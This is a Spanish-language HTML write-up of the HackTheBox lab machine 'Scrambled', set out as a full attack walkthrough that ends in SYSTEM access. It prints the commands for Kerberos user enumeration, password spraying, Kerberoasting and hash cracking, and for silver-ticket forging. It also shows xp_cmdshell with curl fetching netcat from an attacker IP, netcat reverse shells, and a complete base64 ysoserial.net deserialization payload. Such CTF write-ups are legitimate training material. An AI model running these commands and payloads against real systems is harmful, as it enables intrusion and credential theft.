@@ -1,0 +1,359 @@
+<!doctype html>
+<html lang="en-US">
+  <head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+
+<title>Writeup Scrambled HackTheBox</title>
+<link rel="shortcut icon" type="image/png" sizes="64x64" href="https://raw.githubusercontent.com/GatoGamer1155/Imagenes-Repositorios/main/ni/scrambled.png">
+<meta name="generator" content="Jekyll v4.2.2" />
+<meta property="og:title" content="Writeup Scrambled HackTheBox" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Resolución de la máquina Scrambled de la plataforma de HackTheBox" />
+<meta property="og:description" content="Resolución de la máquina Scrambled de la plataforma de HackTheBox" />
+<link rel="canonical" href="http://localhost:4000/another-page.html" />
+<meta property="og:url" content="http://localhost:4000/another-page.html" />
+<meta property="og:site_name" content="Writeup Scrambled HackTheBox" />
+<meta property="og:type" content="website" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Writeup Scrambled HackTheBox" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"WebPage","description":"Resolución de la máquina Scrambled de la plataforma de HackTheBox","headline":"Writeup Scrambled HackTheBox","url":"http://localhost:4000/another-page.html"}</script>
+
+    <link rel="stylesheet" href="/assets/css/style.css?v=">
+    <script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+    <script src="/assets/js/respond.js"></script>
+    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
+
+<meta name="theme-color" content="#353535">
+<meta name="msapplication-navbutton-color" content="#353535">
+<meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
+
+  </head>
+  <body>
+
+    <div class="wrapper">
+
+      <section>
+        <div id="title">
+          <h1>Writeup Scrambled HackTheBox</h1>
+          <p>Resolución de la máquina Scrambled de la plataforma de HackTheBox</p>
+        </div>
+
+<div><p>Iniciamos escaneando los puertos de la máquina con nmap y podemos ver un dominio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ nmap</span><span class="p"> -sC 10.10.11.168
+Nmap scan report for 10.10.11.168
+PORT     STATE SERVICE
+53/tcp   open  domain
+80/tcp   open  http
+88/tcp   open  kerberos-sec
+135/tcp  open  msrpc
+139/tcp  open  netbios-ssn
+389/tcp  open  ldap
+| ssl-cert: Subject: commonName=</span><span class="kd">DC1.scrm.local</span><span class="p">
+445/tcp  open  microsoft-ds
+464/tcp  open  kpasswd5
+593/tcp  open  http-rpc-epmap
+636/tcp  open  ldapssl
+1433/tcp open  ms-sql-s
+3268/tcp open  globalcatLDAP
+3269/tcp open  globalcatLDAPssl
+4411/tcp open  found</span>
+</code></pre></div></div>
+
+<div><p>Como kerberos esta abierto podemos intentar conseguir usuarios válidos con un diccionario</p></div>
+<div><p>Para esto utilizaremos <a href="https://github.com/ropnop/kerbrute">kerbrute</a> y un diccionario de el siguiente <a href="https://github.com/attackdebris/kerberos_enum_userlists/">repositorio</a></p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ kerbrute</span><span class="p"> userenum -d scrm.local --dc dc1.scrm.local A-ZSurnames.txt
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+ >  Using KDC(s):
+ >      dc1.scrm.local:88
+
+</span><span class="s2"> >  [+] VALID USERNAME:  ASMITH@scrm.local
+ >  [+] VALID USERNAME:  KSIMPSON@scrm.local
+ >  [+] VALID USERNAME:  SJENKINS@scrm.local
+ >  [+] VALID USERNAME:  JHALL@scrm.local
+ >  [+] VALID USERNAME:  KHICKS@scrm.local</span><span class="p">
+ >  Done! Tested 13000 usernames (5 valid) in 67.163 seconds</span>
+</code></pre></div></div>
+
+<div><p>Obtenemos algunos usuarios validos, de ellos ksimpson usa su usuario como contraseña</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ kerbrute</span><span class="p"> passwordspray -d scrm.local --dc dc1.scrm.local users.txt ksimpson
+    __             __               __
+   / /_____  _____/ /_  _______  __/ /____
+  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
+ / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
+/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/
+
+ >  Using KDC(s):
+ >      dc1.scrm.local:88
+
+</span><span class="s2"> >  [+] VALID LOGIN:     KSIMPSON@scrm.local:ksimpson</span><span class="p">
+ >  Done! Tested 5 logins (1 successes) in 0.132 seconds</span>
+</code></pre></div></div>
+
+<div><p>Con estas credenciales solicitaremos un ticket para después autenticarnos con kerberos</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-getTGT</span><span class="p"> scrm.local/ksimpson:ksimpson
+Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021
+
+[*] Saving ticket in ksimpson.ccache</span>
+</code></pre></div></div>
+
+<div><p>Ahora con este ticket, podemos conseguir un hash del usuario sqlsvc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ export</span><span class="p"> KRB5CCNAME=ksimpson.ccache
+</span><span class="s2">❯ impacket-GetUserSPNs</span><span class="p"> scrm.local/ksimpson:ksimpson -dc-ip dc1.scrm.local -request -k -no-pass
+Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021
+
+ServicePrincipalName          Name    MemberOf  PasswordLastSet             LastLogon                   Delegation 
+----------------------------  ------  --------  --------------------------  --------------------------  ----------
+MSSQLSvc/dc1.scrm.local:1433  </span><span class="kd">sqlsvc</span><span class="p">            2021-11-03 10:32:02.351452  2022-07-18 18:28:28.115490             
+MSSQLSvc/dc1.scrm.local       </span><span class="kd">sqlsvc</span><span class="p">            2021-11-03 10:32:02.351452  2022-07-18 18:28:28.115490             
+
+$krb5tgs$23$*sqlsvc$SCRM.LOCAL$scrm.local/sqlsvc*$eee76754ccb373aee4f1863840cb6caa$c1e3b23d1cddf8ba5c744d131990c90ca2552eb7075ecdd6e85f77942055e678fc106480c3a5e8fb526ca7927a961bda6be52dfc5eb4874fbdea74697e670369fc1de2a9bfb7bee032c3d1e5c916633e6a5a105df8a97c4f0ca64a86cb3a5f53cff325f0a5ca5e51a361e82c1ec62ec5610a2c4dc6c0dd0f6b6a2146276b9437a1d6edd9addeed0cb7a5e281a057731cfba7d88406fa02a5954bed196e5be5682bed65b58a95114b0a0d2a788e9966d10f252e491792744ab3cf6b97595fb2a87141b911a15104f1626cf526b020a0c3d005f4bf3c2ac3827cfcff318f55d5acd1be35e26d9e145e07a719adcd56254aaa0abdc5cd4fe0a4b9a91cb7f74e4b1e813e1f97c8708bbb4ecde2116e57b1d19310dc9bce6b6c419eb8ba3024c404d18c757f757e309936e183a63e0ead072a3e7a6f8497d2b871b9235eb471aacbe959f4fcb1e982ebae3af50edefcb6f61a1e0d3cf18a0cdfbf286186f11207dafb4a8cbe1ac8eb331ff516b4c0cd449dc2772bc8a127e5689bc617ef6ba8bc4ba456f03a8ca1c3c8044e1e4e353500338aefef54f9e63548e70aae38b9fb9f9b17e53fb3f4f8f065d4e54456b5daa83eda4579c82a89cab473e109c91a9580f39b316854e386353eea6b8cace97234073284c3052a08223e0d894b5934df79bd64942b35221fde6a353fdd39ae1cfb6cc4fd75e5312e946d37057754b3f0db6de14b94b3841751b61b0ff6ca9d9724ad7ae42a75838665299d5e512967156d29e8dc54397d1a72c591584e10f590885d98a4c1c312408a2ee9e445069cd26c0a3b19b476b303795826be1f76a1f928b2226824f68b65d5874dfeb40b60ca53263cb96e471839a467d1c279f58afad62773151c0d07940beaeb43acf73f1547e745f18794bf6e74706d7388db39cca42b157d0b13693c723e8d5fe49aac9d04363036e0bb6a4dc0a4bab67b207e1dc6d3cd7d3aacbeee2b11d06078fd6a5efd09557bae517bc92ed9657817c7e1f917c9174b28d84abbefa1f10a651a91b50c563b6913c5c1b447af1a80a8a44b9749916c10189395817afd61698ae2509c3e403dd73240bedabca9bda9c7b15745cb13600937b99728f13f84f2d46dd064bb7f830387cca879f3e10362a2cbe67689186054f83bd05a9366cfc75207c63935027e930d09807a6a0015c1cef08fa5b9ab39df8843db4e21f9020a9972fd3832a493a6bd6c1e8b3629f319bc83ca322269b245f496541cfafeedac06f25701b00204d7077a47b3af536d7e8484292796e8f6b69aded74c2dc34a92292462b04c657da6a171f1c2f0af07f3622eeb8d4aa517d1ddf7b1f4bc0bee3fab2c81728d0e36498802d4097fd6eb1361bb5c77c6ae8eb2e08d2e88cf6b2b792eb69172345484d9ea5fe26c50e3e0588c97e4272528f96691077cafcaa59fa5ab47</span>
+</code></pre></div></div>
+
+<div><p>Al aplicar fuerza bruta al hash obtenemos la contraseña Pegasus60</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ john</span><span class="p"> -w=/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt hash
+Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
+</span><span class="kd">Pegasus60</span><span class="p">        (</span><span class="kd">sqlsvc</span><span class="p">)
+Session completed</span>
+</code></pre></div></div>
+
+<div><p>Con secretsdump en modo debug podemos obtener el sid del dominio</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-secretsdump</span><span class="p"> -k scrm.local/ksimpson@dc1.scrm.local -no-pass -debug
+[+] Using Kerberos Cache: krb_ccache
+[+] SPN CIFS/DC1.SCRM.LOCAL@SCRM.LOCAL not found in cache
+[+] AnySPN is True, looking for another suitable SPN
+[+] Returning cached credential for KRBTGT/SCRM.LOCAL@SCRM.LOCAL
+[+] Using TGT from cache
+[+] Trying to connect to KDC at SCRM.LOCAL
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+[+] Session resume file will be sessionresume_UQuuEZWh
+[+] Trying to connect to KDC at SCRM.LOCAL
+[+] Calling DRSCrackNames for </span><span class="kd">S-1-5-21-2743207045-1827831105-2542523200-500</span><span class="p">
+[+] Calling DRSGetNCChanges for {edaf791f-e75b-4711-8232-3cd66840032a} 
+[*] Cleaning up...</span>
+</code></pre></div></div>
+
+<div><p>Con ayuda de <a href="https://codebeautify.org/ntlm-hash-generator">codebeautify</a> podemos convertir la contraseña a un hash ntlm</p></div>
+<div><p><img src="./1.png"><p></div>
+
+<div><p>Podemos obtener un ticket con la información que tenemos esta vez para el usuario sqlsvc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ impacket-ticketer</span><span class="p"> -domain scrm.local -spn MSSQLSVC/dc1.scrm.local -user-id 500 Administrator -nthash b999a16500b87d17ec7f2e2a68778f05 -domain-sid S-1-5-21-2743207045-1827831105-2542523200
+Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021
+
+[*] Creating basic skeleton ticket and PAC Infos
+[*] Customizing ticket for scrm.local/Administrator
+[*]	PAC_LOGON_INFO
+[*]	PAC_CLIENT_INFO_TYPE
+[*]	EncTicketPart
+[*]	EncTGSRepPart
+[*] Signing/Encrypting final ticket
+[*]	PAC_SERVER_CHECKSUM
+[*]	PAC_PRIVSVR_CHECKSUM
+[*]	EncTicketPart
+[*]	EncTGSRepPart
+[*] Saving ticket in Administrator.ccache</span>
+</code></pre></div></div>
+
+<div><p>Con este ticket podemos autenticarnos a sql con mssqlclient</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ export</span><span class="p"> KRB5CCNAME=Administrator.ccache
+</span><span class="s2">❯ impacket-mssqlclient</span><span class="p"> dc1.scrm.local -k -no-pass
+Impacket v0.9.25.dev1+20211027.123255.1dad8f7f - Copyright 2021
+
+[*] Encryption required, switching to TLS
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
+[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
+[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192
+[*] INFO(DC1): Line 1: Changed database context to 'master'.
+[*] INFO(DC1): Line 1: Changed language setting to us_english.
+[*] ACK: Result: 1 - Microsoft SQL Server (150 7208) 
+[!] Press help for extra shell commands
+SQL></span>
+</code></pre></div></div>
+
+<div><p>Mirando el contenido de la base de datos encontramos credenciales</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">SQL> </span><span class="p">SELECT name FROM master.dbo.sysdatabases
+name
+---------------------------------------------------------------------   
+master
+tempdb
+model
+msdb
+ScrambleHR
+
+</span><span class="no">SQL></span><span class="p"> use ScrambleHR
+[*] ENVCHANGE(DATABASE): Old Value: master, New Value: ScrambleHR
+[*] INFO(DC1): Line 1: Changed database context to 'ScrambleHR'.
+
+</span><span class="no">SQL></span><span class="p"> select * from UserImport
+LdapUser            LdapPwd                      LdapDomain
+-----------------   --------------------------   -------------------
+</span><span class="kd">MiscSvc             ScrambledEggs9900            scrm.local
+
+</span><span class="no">SQL></span>
+</code></pre></div></div>
+
+<div><p>Tambien podemos habilitar xp_cmdshell para ejecutar comandos como sqlsvc</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">SQL> </span><span class="p">enable_xp_cmdshell
+
+</span><span class="no">SQL> </span><span class="p">xp_cmdshell whoami
+output
+
+--------------------------------------------------------------------
+scrm\sqlsvc
+
+NULL
+
+</span><span class="no">SQL></span>
+</code></pre></div></div>
+
+
+<div><p>Ahora podemos compartir y traer netcat de nuestro equipo para obtener una powershell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="no">SQL> </span><span class="p">xp_cmdshell curl 10.10.14.10/netcat.exe -o C:\Temp\netcat.exe
+output
+
+------------------------------------------------------------------------
+  % Total    % Received % Xferd  Average Speed   Time    Time     Time
+
+                                 Dload  Upload   Total   Spent    Left
+100 45272  100 45272    0     0  97638      0 --:--:-- --:--:-- --:--:--
+
+NULL
+
+</span><span class="no">SQL> </span><span class="p">xp_cmdshell C:\Temp\netcat.exe -e powershell 10.10.14.10 443</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.168
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Windows\system32> </span><span class="no">whoami</span><span class="p">
+scrm\sqlsvc
+PS C:\Windows\system32> </span><span class="no">hostname</span><span class="p">
+DC1
+PS C:\Windows\system32></span>
+</code></pre></div></div>
+
+<div><p>Con powershell podemos usar las credenciales que encontramos antes para ejecutar comandos</p></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\system32> </span><span class="no">$SecPassword = ConvertTo-SecureString 'ScrambledEggs9900' -AsPlainText -Force</span><span class="p">
+PS C:\Windows\system32> </span><span class="no">$Cred = New-Object System.Management.Automation.PSCredential('Scrm\MiscSvc', $SecPassword)</span><span class="p">
+PS C:\Windows\system32> </span><span class="no">Invoke-Command -Computer dc1 -Credential $Cred -Command { whoami }</span><span class="p">
+scrm\miscsvc
+PS C:\Windows\system32></span>
+</code></pre></div></div>
+
+<div><p>Ahora podemos enviarnos una powershell y conseguir la flag del usuario</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Windows\system32> </span><span class="no">Invoke-Command -Computer dc1 -Credential $Cred -Command { cmd /c C:\Temp\netcat.exe -e powershell 10.10.14.10 443 }</span>
+</code></pre></div></div>
+
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.168
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Users\miscsvc\Documents> </span><span class="no">whoami</span><span class="p">
+scrm\miscsvc
+PS C:\Users\miscsvc\Documents> </span><span class="no">type ..\Desktop\user.txt</span><span class="p">
+8aa**************************b6b
+PS C:\Users\miscsvc\Documents></span>
+</code></pre></div></div>
+
+<div><p>Encontramos un directorio con un dll y un exe, y parece que es lo que corre en el puerto 4411</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">PS C:\Shares\IT\Apps\Sales Order Client> </span><span class="no">dir</span><span class="p">
+
+    Directory: C:\Shares\IT\Apps\Sales Order Client
+
+Mode                LastWriteTime         Length Name
+----                -------------         ------ ----
+-a----       05/11/2021     20:52          86528 ScrambleClient.exe
+-a----       05/11/2021     20:52          19456 ScrambleLib.dll</span>
+</code></pre></div></div>
+
+<div><p>Encontramos en la funcion UploadOrder una deserialización que podemos explotar</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="kd">public</span><span class="p"> void UploadOrder(</span><span class="k">SalesOrder NewOrder</span><span class="p">)
+{
+    </span><span class="kd">try</span><span class="p">
+    {
+        </span><span class="k">Log</span><span class="p">.</span><span class="k">Write</span><span class="p">(</span><span class="s2">"Uploading new order with reference "</span><span class="kd"> + </span><span class="k">NewOrder</span><span class="p">.</span><span class="k">ReferenceNumber</span><span class="p">);
+        string text </span><span class="kd">=</span><span class="k"> NewOrder</span><span class="p">.</span><span class="k">SerializeToBase64</span><span class="p">();
+        </span><span class="k">Log</span><span class="p">.</span><span class="k">Write</span><span class="p">(</span><span class="s2">"Order serialized to base64: "</span><span class="kd"> +</span><span class="p"> text);
+        </span><span class="k">ScrambleNetResponse </span><span class="p">scrambleNetResponse </span><span class="kd">=</span><span class="p"> this.SendRequestAndGetResponse(</span><span class="kd">new </span><span class="k">ScrambleNetRequest</span><span class="p">(</span><span class="k">ScrambleNetRequest</span><span class="p">.</span><span class="k">RequestType</span><span class="p">.</span><span class="k">UploadOrd</span><span class="p">...
+        </span><span class="k">ScrambleNetResponse</span><span class="p">.</span><span class="k">ResponseType</span><span class="p"> type </span><span class="kd">=</span><span class="p"> scrambleNetResponse.</span><span class="k">Type</span><span class="p">;
+        </span><span class="kd">if</span><span class="p"> (type </span><span class="kd">!=</span><span class="k"> ScrambleNetResponse</span><span class="p">.</span><span class="k">ResponseType</span><span class="p">.</span><span class="k">Success</span><span class="p">)
+        {
+            </span><span class="kd">throw new</span><span class="k"> ApplicationException</span><span class="p">(</span><span class="p">scrambleNetResponse.GetErrorDescription());
+        }
+        </span><span class="k">Log</span><span class="p">.</span><span class="k">Write</span><span class="p">(</span><span class="s2">"Upload successful"</span><span class="p">);
+    }
+    </span><span class="kd">catch</span><span class="p"> (</span><span class="k">Exception </span><span class="na">expr_5F</span><span class="p">)
+    {
+    </span><span class="k">ProjectData</span><span class="p">.</span><span class="k">SetProjectError</span><span class="p">(expr_5F);
+    </span><span class="k">Exception </span><span class="p">ex </span><span class="kd">=</span><span class="p"> expr_5F;
+    </span><span class="k">Log</span><span class="p">.</span><span class="k">Write</span><span class="p">(</span><span class="s2">"Error: " </span><span class="kd">+</span><span class="k"> ex</span><span class="p">.</span><span class="k">Message</span><span class="p">);
+    </span><span class="kd">throw</span><span class="p"> ex;
+    }
+}</span>
+</code></pre></div></div>
+
+<div><p>Con ayuda de <a href="https://github.com/pwntester/ysoserial.net">ysoserial</a> en un windows crearemos una data que nos envie una powershell</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="p">pc1@windows C:\CTF\ysoserial> </span><span class="no">.\ysoserial.exe -f BinaryFormatter -g WindowsIdentity -o base64 -c "C:\Temp\netcat.exe -e powershell 10.10.14.10 443"</span><span class="p">
+AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA/AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBM2dVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nUXpwY1ZHVnRjRnh1WlhSallYUXVaWGhsSUMxbElIQnZkMlZ5YzJobGJHd2dNVEF1TVRBdU1UUXVNVEFnTkRReklpQlRkR0Z1WkdGeVpFVnljbTl5Ulc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVGRHRnVaR0Z5WkU5MWRIQjFkRVZ1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVlhObGNrNWhiV1U5SWlJZ1VHRnpjM2R2Y21ROUludDRPazUxYkd4OUlpQkViMjFoYVc0OUlpSWdURzloWkZWelpYSlFjbTltYVd4bFBTSkdZV3h6WlNJZ1JtbHNaVTVoYldVOUltTnRaQ0lnTHo0TkNpQWdJQ0FnSUR3dmMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ1BDOXpaRHBRY205alpYTnpQZzBLSUNBOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNVBZbXBsWTNSSmJuTjBZVzVqWlQ0TkNqd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlQZ3M9Cw==
+pc1@windows C:\CTF\ysoserial></span>
+</code></pre></div></div>
+
+<div><p>Con netcat nos conectaremos al puerto 4411 y enviaremos la data despues de la función</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ netcat</span><span class="p"> 10.10.11.168 4411
+</span><span class="na">SCRAMBLECORP_ORDERS_V1.0.3;</span><span class="p">
+UPLOAD_ORDER;AAEAAAD/////AQAAAAAAAAAEAQAAAClTeXN0ZW0uU2VjdXJpdHkuUHJpbmNpcGFsLldpbmRvd3NJZGVudGl0eQEAAAAkU3lzdGVtLlNlY3VyaXR5LkNsYWltc0lkZW50aXR5LmFjdG9yAQYCAAAA/AlBQUVBQUFELy8vLy9BUUFBQUFBQUFBQU1BZ0FBQUY1TmFXTnliM052Wm5RdVVHOTNaWEpUYUdWc2JDNUZaR2wwYjNJc0lGWmxjbk5wYjI0OU15NHdMakF1TUN3Z1EzVnNkSFZ5WlQxdVpYVjBjbUZzTENCUWRXSnNhV05MWlhsVWIydGxiajB6TVdKbU16ZzFObUZrTXpZMFpUTTFCUUVBQUFCQ1RXbGpjbTl6YjJaMExsWnBjM1ZoYkZOMGRXUnBieTVVWlhoMExrWnZjbTFoZEhScGJtY3VWR1Y0ZEVadmNtMWhkSFJwYm1kU2RXNVFjbTl3WlhKMGFXVnpBUUFBQUE5R2IzSmxaM0p2ZFc1a1FuSjFjMmdCQWdBQUFBWURBQUFBM2dVOFAzaHRiQ0IyWlhKemFXOXVQU0l4TGpBaUlHVnVZMjlrYVc1blBTSjFkR1l0T0NJL1BnMEtQRTlpYW1WamRFUmhkR0ZRY205MmFXUmxjaUJOWlhSb2IyUk9ZVzFsUFNKVGRHRnlkQ0lnU1hOSmJtbDBhV0ZzVEc5aFpFVnVZV0pzWldROUlrWmhiSE5sSWlCNGJXeHVjejBpYUhSMGNEb3ZMM05qYUdWdFlYTXViV2xqY205emIyWjBMbU52YlM5M2FXNW1lQzh5TURBMkwzaGhiV3d2Y0hKbGMyVnVkR0YwYVc5dUlpQjRiV3h1Y3pwelpEMGlZMnh5TFc1aGJXVnpjR0ZqWlRwVGVYTjBaVzB1UkdsaFoyNXZjM1JwWTNNN1lYTnpaVzFpYkhrOVUzbHpkR1Z0SWlCNGJXeHVjenA0UFNKb2RIUndPaTh2YzJOb1pXMWhjeTV0YVdOeWIzTnZablF1WTI5dEwzZHBibVo0THpJd01EWXZlR0Z0YkNJK0RRb2dJRHhQWW1wbFkzUkVZWFJoVUhKdmRtbGtaWEl1VDJKcVpXTjBTVzV6ZEdGdVkyVStEUW9nSUNBZ1BITmtPbEJ5YjJObGMzTStEUW9nSUNBZ0lDQThjMlE2VUhKdlkyVnpjeTVUZEdGeWRFbHVabTgrRFFvZ0lDQWdJQ0FnSUR4elpEcFFjbTlqWlhOelUzUmhjblJKYm1adklFRnlaM1Z0Wlc1MGN6MGlMMk1nUXpwY1ZHVnRjRnh1WlhSallYUXVaWGhsSUMxbElIQnZkMlZ5YzJobGJHd2dNVEF1TVRBdU1UUXVNVEFnTkRReklpQlRkR0Z1WkdGeVpFVnljbTl5Ulc1amIyUnBibWM5SW50NE9rNTFiR3g5SWlCVGRHRnVaR0Z5WkU5MWRIQjFkRVZ1WTI5a2FXNW5QU0o3ZURwT2RXeHNmU0lnVlhObGNrNWhiV1U5SWlJZ1VHRnpjM2R2Y21ROUludDRPazUxYkd4OUlpQkViMjFoYVc0OUlpSWdURzloWkZWelpYSlFjbTltYVd4bFBTSkdZV3h6WlNJZ1JtbHNaVTVoYldVOUltTnRaQ0lnTHo0TkNpQWdJQ0FnSUR3dmMyUTZVSEp2WTJWemN5NVRkR0Z5ZEVsdVptOCtEUW9nSUNBZ1BDOXpaRHBRY205alpYTnpQZzBLSUNBOEwwOWlhbVZqZEVSaGRHRlFjbTkyYVdSbGNpNVBZbXBsWTNSSmJuTjBZVzVqWlQ0TkNqd3ZUMkpxWldOMFJHRjBZVkJ5YjNacFpHVnlQZ3M9Cw==</span>
+</code></pre></div></div>
+
+<div><p>Recibimos la shell como nt authority system y podemos leer la ultima flag</p></div>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight">
+<code><span class="s2">❯ sudo netcat</span><span class="p"> -lvnp 443
+Listening on 0.0.0.0 443
+Connection received on 10.10.11.168
+Windows PowerShell 
+Copyright (C) Microsoft Corporation. All rights reserved.
+PS C:\Windows\system32> </span><span class="no">whoami</span><span class="p">
+nt authority\system
+PS C:\Windows\system32> </span><span class="no">type C:\Users\Administrator\Desktop\root.txt</span><span class="p">
+71c**************************11e
+PS C:\Windows\system32></span>
+</code></pre></div></div>
+
+<p><a href="./../../">Página Principal</a></p>
+
+      </section>
+
+    </div>
+  </body>
+</html>
